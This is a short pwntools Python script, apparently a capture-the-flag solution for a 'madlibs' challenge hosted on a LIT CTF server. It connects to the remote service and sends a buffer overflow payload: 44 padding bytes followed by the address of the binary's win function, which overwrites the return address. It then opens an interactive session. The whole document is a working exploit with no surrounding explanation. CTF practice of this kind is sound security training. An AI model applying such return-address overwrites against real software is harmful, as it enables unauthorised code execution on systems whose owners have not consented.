from pwn import *
elf = ELF('madlibs', checksec=False)
context.binary = elf

s = remote('madlibs.litctf.live', 1337)

template = "%s is so %s at deepspacewaifu! I wish I were %s like %s"
template = template.replace('%s', '')

noun = b'a'*44 + p64(elf.symbols.win)
s.sendline(noun)

adj  = b'a' * 63
s.sendline(adj)

s.interactive()
